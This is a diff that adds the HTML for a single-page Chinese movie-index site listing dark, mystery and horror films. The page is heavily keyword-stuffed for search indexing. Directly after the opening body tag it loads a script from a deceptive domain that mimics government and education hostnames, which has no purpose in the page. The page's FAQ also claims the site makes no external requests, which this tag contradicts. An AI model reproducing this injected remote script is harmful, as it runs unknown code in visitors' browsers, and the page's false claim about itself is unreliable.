@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>欧美午夜电影网 - 欧美暗黑悬疑电影在线观看 | 欧美午夜电影网官网</title>
+<meta name="description" content="欧美午夜电影网（https://oumeiwuyedianyingwang-top.github.io）专注欧美暗黑、悬疑、惊悚、犯罪与午夜恐怖电影索引，含午夜剧场、类型档案、放映排期与冷门推荐，移动端自适应，适合必应收录。">
+<meta name="keywords" content="欧美午夜电影网, 欧美电影, 暗黑悬疑, 午夜恐怖片, 惊悚犯罪, oumeiwuyedianyingwang-top">
+<style>
+:root{
+  --night:#080912;
+  --night2:#0d101c;
+  --panel:#131727;
+  --silver:#c7ccda;
+  --steel:#7d8aab;
+  --wine:#8b1e3f;
+  --wine2:#c1275e;
+  --text:#e9ecf5;
+  --muted:#9aa3bb;
+  --line:rgba(199,204,218,.16);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(900px 500px at 12% 4%, rgba(139,30,63,.22), transparent 60%),
+    radial-gradient(800px 400px at 92% 18%, rgba(125,138,171,.12), transparent 60%),
+    var(--night);
+  color:var(--text);
+  line-height:1.7;
+  font-size:16px;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* 顶栏 */
+.header{position:sticky;top:0;z-index:1000;background:rgba(8,9,18,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:70px}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:20px;letter-spacing:.5px}
+.brand .reel{width:36px;height:36px;border-radius:50%;border:3px solid var(--silver);position:relative;display:flex;align-items:center;justify-content:center}
+.brand .reel::after{content:'';position:absolute;width:12px;height:12px;border-radius:50%;background:var(--wine2)}
+.brand b{color:var(--wine2)}
+.menu{display:flex;gap:24px}
+.menu a{font-size:15px;color:var(--muted);position:relative;transition:.25s}
+.menu a:hover{color:var(--silver)}
+
+/* 通用 */
+.eyebrow{font-size:12px;letter-spacing:4px;color:var(--silver);text-transform:uppercase;border-left:3px solid var(--wine2);padding-left:12px}
+.h2{font-size:30px;font-weight:900;margin:10px 0 8px}
+.h2 i{font-style:normal;color:var(--wine2)}
+.sub{color:var(--muted);max-width:720px;margin-bottom:30px}
+.section{padding:64px 0}
+
+/* Hero */
+.hero{padding:56px 0 30px}
+.marquee{overflow:hidden;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:10px 0;margin-bottom:34px;color:var(--steel);font-size:14px;letter-spacing:2px}
+.marquee span{display:inline-block;padding-right:40px}
+.stage{display:grid;grid-template-columns:1.2fr .8fr;gap:24px;align-items:stretch}
+.screen{background:linear-gradient(155deg,var(--panel),var(--night2));border:1px solid var(--line);border-radius:18px;padding:38px;position:relative;overflow:hidden}
+.screen::before{content:'NOIR';position:absolute;right:-10px;bottom:-18px;font-size:130px;font-weight:900;color:rgba(199,204,218,.04);letter-spacing:6px}
+.screen .live{position:absolute;top:20px;right:20px;font-size:12px;letter-spacing:3px;color:var(--wine2);border:1px solid var(--wine2);padding:4px 12px;border-radius:6px}
+.screen h1{font-size:46px;line-height:1.1;font-weight:900}
+.screen h1 b{color:var(--wine2)}
+.screen h1 span{color:var(--silver)}
+.screen p{color:var(--muted);margin:18px 0 26px;max-width:520px;position:relative;z-index:1}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{border:none;cursor:pointer;font-weight:800;font-size:15px;padding:13px 26px;border-radius:10px;transition:.25s}
+.btn-wine{background:var(--wine2);color:#fff}
+.btn-wine:hover{background:var(--wine);transform:translateY(-2px)}
+.btn-line{background:transparent;border:1px solid var(--silver);color:var(--silver)}
+.btn-line:hover{background:var(--silver);color:var(--night)}
+.reel-side{display:flex;flex-direction:column;gap:16px}
+.reel-stat{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:22px 24px;flex:1;display:flex;flex-direction:column;justify-content:center}
+.reel-stat .num{font-size:34px;font-weight:900;color:var(--silver);font-family:ui-monospace,monospace}
+.reel-stat .lbl{font-size:13px;color:var(--muted);letter-spacing:1px}
+
+/* 胶片片单 */
+.strip{display:flex;gap:20px;overflow-x:auto;padding:6px 4px 18px;scrollbar-width:thin}
+.strip::-webkit-scrollbar{height:8px}
+.strip::-webkit-scrollbar-thumb{background:var(--wine);border-radius:8px}
+.cell{flex:0 0 260px;background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s}
+.cell:hover{transform:translateY(-8px);border-color:var(--wine2);box-shadow:0 16px 36px rgba(139,30,63,.25)}
+.frame{height:150px;display:flex;align-items:center;justify-content:center;font-size:42px;color:#150a10;position:relative;background:linear-gradient(135deg,var(--silver),var(--steel))}
+.frame.wine{background:linear-gradient(135deg,var(--wine2),var(--wine))}
+.frame .badge{position:absolute;top:10px;left:10px;font-size:11px;background:rgba(0,0,0,.55);color:#fff;padding:3px 9px;border-radius:5px}
+.cell .info{padding:16px}
+.cell h3{font-size:17px;margin-bottom:6px}
+.cell p{font-size:13px;color:var(--muted)}
+
+/* 类型档案 */
+.archive{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.file{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:22px 18px;transition:.3s;position:relative}
+.file:hover{border-color:var(--silver);background:linear-gradient(180deg,var(--panel),var(--night2));transform:translateY(-4px)}
+.file .glyph{font-size:28px}
+.file h3{font-size:17px;margin:10px 0 4px;color:var(--silver)}
+.file small{color:var(--muted);font-size:13px}
+
+/* 放映排期 */
+.schedule{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.show{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:22px;display:grid;grid-template-columns:80px 1fr auto;gap:16px;align-items:center;transition:.25s}
+.show:hover{border-color:var(--wine2);transform:translateX(6px)}
+.show .clock{font-family:ui-monospace,monospace;color:var(--silver);font-size:17px;font-weight:800}
+.show h3{font-size:17px}
+.show p{font-size:13px;color:var(--muted)}
+.ticket{font-size:12px;padding:5px 12px;border-radius:20px;border:1px solid var(--wine2);color:var(--wine2)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:30px}
+.urlbox{display:inline-block;margin:14px 0;padding:14px 18px;border:1px dashed var(--silver);border-radius:10px;background:rgba(199,204,218,.06);color:var(--silver);font-family:monospace;font-size:16px}
+.quote{background:var(--night2);border-left:4px solid var(--wine2);padding:20px;border-radius:10px;margin-top:18px}
+.quote p{font-size:15px;color:var(--muted);font-style:italic}
+.faq{display:flex;flex-direction:column;gap:0}
+.faq details{border-bottom:1px solid var(--line);padding:16px 0}
+.faq summary{cursor:pointer;font-weight:700;color:var(--silver)}
+.faq p{color:var(--muted);font-size:14px;margin-top:8px}
+
+footer{border-top:1px solid var(--line);margin-top:40px;background:#05060a}
+.foot{max-width:1180px;margin:0 auto;padding:30px 20px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;color:var(--muted);font-size:14px}
+.foot a{color:var(--wine2)}
+
+@media(max-width:900px){
+  .stage{grid-template-columns:1fr}
+  .archive{grid-template-columns:repeat(2,1fr)}
+  .schedule{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .nav{height:auto;padding:14px 0;flex-direction:column;gap:12px}
+  .menu{width:100%;overflow:auto;gap:18px;padding-bottom:6px}
+  .screen{padding:30px 22px}
+  .screen h1{font-size:30px}
+  .show{grid-template-columns:64px 1fr;gap:10px}
+  .ticket{display:none}
+  .archive{grid-template-columns:1fr 1fr}
+  .h2{font-size:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="header">
+  <div class="wrap nav">
+    <a class="brand" href="#"><span class="reel"></span>欧美<b>午夜</b>电影网</a>
+    <nav aria-label="主导航">
+      <ul class="menu">
+        <li><a href="#home">开场</a></li>
+        <li><a href="#strip">午夜片单</a></li>
+        <li><a href="#archive">类型档案</a></li>
+        <li><a href="#schedule">放映排期</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="marquee">
+      <span>★ NOW SHOWING · 欧美暗黑 · 悬疑犯罪 · 惊悚恐怖 · 午夜剧场 · 冷门佳作 · NOW SHOWING · 欧美暗黑 · 悬疑犯罪 · 惊悚恐怖 · 午夜剧场 · 冷门佳作 ★</span>
+    </div>
+    <div class="stage">
+      <div class="screen">
+        <span class="live mono">● MIDNIGHT SHOW</span>
+        <span class="eyebrow">European & American Midnight Cinema</span>
+        <h1>当钟声敲响<br><b>欧美午夜电影网</b><br><span>亮灯放映</span></h1>
+        <p>欧美午夜电影网（https://oumeiwuyedianyingwang-top.github.io）专做欧美暗黑、悬疑、惊悚、犯罪与午夜恐怖电影索引：经典黑色电影到当代冷门佳作，天黑之后最对味的片单都在这里。</p>
+        <div class="btns">
+          <a class="btn btn-wine" href="#strip">查看午夜片单 #</a>
+          <a class="btn btn-line" href="#schedule">放映排期 #</a>
+        </div>
+      </div>
+      <aside class="reel-side">
+        <div class="reel-stat"><div class="num mono">4,200+</div><div class="lbl">欧美影片索引</div></div>
+        <div class="reel-stat"><div class="num mono">1,180</div><div class="lbl">悬疑犯罪片</div></div>
+        <div class="reel-stat"><div class="num mono">760</div><div class="lbl">午夜恐怖片</div></div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 栏目1 午夜片单 -->
+  <section class="section" id="strip">
+    <span class="eyebrow">Reel 01 / 午夜片单</span>
+    <h2 class="h2">午夜 <i>片单</i></h2>
+    <p class="sub">欧美午夜电影网精选冷调悬疑与暗黑惊悚，横向滑动浏览，点击进入占位内页。</p>
+    <div class="strip">
+      <article class="cell"><div class="frame">🕯️<span class="badge">NOIR</span></div><div class="info"><h3>雨夜证人</h3><p>黑色电影 · 律师与谋杀案 · 1080P</p></div></article>
+      <article class="cell"><div class="frame wine">🔪<span class="badge">THRILLER</span></div><div class="info"><h3>静默猎手</h3><p>心理惊悚 · 密闭别墅 · 4K</p></div></article>
+      <article class="cell"><div class="frame">🧛<span class="badge">HORROR</span></div><div class="info"><h3>午夜血族</h3><p>哥特恐怖 · 古堡家族 · 1080P</p></div></article>
+      <article class="cell"><div class="frame wine">🚪<span class="badge">MYSTERY</span></div><div class="info"><h3>七号房间</h3><p>悬疑推理 · 封闭空间 · 1080P</p></div></article>
+      <article class="cell"><div class="frame">🩸<span class="badge">CRIME</span></div><div class="info"><h3>夜行者档案</h3><p>犯罪剧情 · 城市暗面 · 4K</p></div></article>
+      <article class="cell"><div class="frame wine">🌑<span class="badge">DARK</span></div><div class="info"><h3>黑暗缪斯</h3><p>暗黑文艺 · 画家与执念 · 1080P</p></div></article>
+      <article class="cell"><div class="frame">⚰️<span class="badge">GOTHIC</span></div><div class="info"><h3>幽灵庄园</h3><p>哥特悬疑 · 遗产之谜 · 1080P</p></div></article>
+    </div>
+  </section>
+
+  <!-- 栏目2 类型档案 -->
+  <section class="section" id="archive">
+    <span class="eyebrow">Reel 02 / 类型档案</span>
+    <h2 class="h2">类型 <i>档案</i></h2>
+    <p class="sub">欧美午夜电影网按暗黑情绪分库，锚点直达；子页未建时统一 # 占位。</p>
+    <div class="archive">
+      <a class="file" href="#"><div class="glyph">🎩</div><h3>黑色电影</h3><small>侦探、蛇蝎美人、雨夜</small></a>
+      <a class="file" href="#"><div class="glyph">🩸</div><h3>惊悚犯罪</h3><small>追凶、心理博弈、反转</small></a>
+      <a class="file" href="#"><div class="glyph">🧟</div><h3>午夜恐怖</h3><small>哥特、血族、幽灵</small></a>
+      <a class="file" href="#"><div class="glyph">🕵️</div><h3>密室悬疑</h3><small>封闭空间、推理、逃生</small></a>
+      <a class="file" href="#"><div class="glyph">🪞</div><h3>心理惊悚</h3><small>人格、记忆、妄想</small></a>
+      <a class="file" href="#"><div class="glyph">🎭</div><h3>暗黑剧情</h3><small>人性、堕落、救赎</small></a>
+      <a class="file" href="#"><div class="glyph">🗝️</div><h3>哥特文艺</h3><small>庄园、书信、宿命</small></a>
+      <a class="file" href="#"><div class="glyph">🎻</div><h3>古典惊悚</h3><small>歌剧、协奏、谋杀</small></a>
+    </div>
+  </section>
+
+  <!-- 栏目3 放映排期 -->
+  <section class="section" id="schedule">
+    <span class="eyebrow">Reel 03 / 放映排期</span>
+    <h2 class="h2">放映 <i>排期</i></h2>
+    <p class="sub">按午夜时段排好的欧美片单，欧美午夜电影网单页即可按顺序选片。</p>
+    <div class="schedule">
+      <div class="show"><div class="clock">21:00</div><div><h3>黑色电影开场：雨夜证人</h3><p>经典黑色电影范式，雨夜、烟斗与独白</p></div><span class="ticket">开档</span></div>
+      <div class="show"><div class="clock">22:30</div><div><h3>静默猎手</h3><p>心理惊悚，节奏由静到爆</p></div><span class="ticket">主推</span></div>
+      <div class="show"><div class="clock">00:00</div><div><h3>午夜血族</h3><p>哥特恐怖，古堡家族秘辛</p></div><span class="ticket">午夜场</span></div>
+      <div class="show"><div class="clock">01:30</div><div><h3>七号房间</h3><p>密室悬疑，七名嫌疑人</p></div><span class="ticket">反转场</span></div>
+      <div class="show"><div class="clock">02:45</div><div><h3>黑暗缪斯</h3><p>暗黑文艺，画家与执念</p></div><span class="ticket">文艺场</span></div>
+      <div class="show"><div class="clock">04:00</div><div><h3>幽灵庄园</h3><p>哥特悬疑收尾，天亮前结束</p></div><span class="ticket">收档</span></div>
+    </div>
+  </section>
+
+  <!-- 栏目4 关于 -->
+  <section class="section" id="about">
+    <span class="eyebrow">Reel 04 / 关于本站</span>
+    <h2 class="h2">关于 <i>欧美午夜电影网</i></h2>
+    <div class="about">
+      <div class="panel">
+        <p>欧美午夜电影网是静态单页影视索引站，专注“天黑后看欧美什么”：午夜片单、类型档案、放映排期与关于四个常设栏目。官网地址如下，可收藏并通过必应站长工具提交首页加快收录。</p>
+        <div class="urlbox">https://oumeiwuyedianyingwang-top.github.io</div>
+        <div class="quote"><p>“午夜的正确打开方式，是把灯关掉、把字幕打开，让一部好电影接管整座房间。”</p></div>
+        <div class="btns" style="margin-top:22px"><a class="btn btn-wine" href="#home">返回开场 #</a></div>
+      </div>
+      <div class="panel">
+        <h3 style="font-size:20px;margin-bottom:6px;color:var(--silver)">常问问题</h3>
+        <div class="faq">
+          <details open><summary>欧美午夜电影网提供什么内容？</summary><p>提供欧美黑色电影、悬疑犯罪、惊悚恐怖、哥特文艺的片单索引；本单页为展示版，不直接托管视频。</p></details>
+          <details><summary>移动端好用吗？</summary><p>纯静态 HTML 与内联 CSS，无外部请求；视口自适应，手机端导航可横滑、片单条可左右滑动。</p></details>
+          <details><summary>必应多久收录单页？</summary><p>新站无固定时间；提交首页 URL 后通常数天到两周不等，受内容唯一性、可访问性与外链影响。</p></details>
+          <details><summary>内页链接为什么是 #？</summary><p>按你的要求子页未生成时统一用 # 占位，后续可替换为真实文章或播放页路径，不改变首页结构。</p></details>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div>
+      <p>欧美午夜电影网 · 欧美暗黑悬疑影视索引（https://oumeiwuyedianyingwang-top.github.io）</p>
+      <p>关键词：欧美午夜电影网、欧美电影、暗黑悬疑、oumeiwuyedianyingwang-top</p>
+    </div>
+    <div>
+      <p><a href="#home">开场 #</a> ｜ <a href="#strip">午夜片单 #</a> ｜ <a href="#archive">类型档案 #</a> ｜ <a href="#schedule">放映排期 #</a></p>
+      <p>© 2026 欧美午夜电影网 单页展示，内页以 # 替代。</p>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
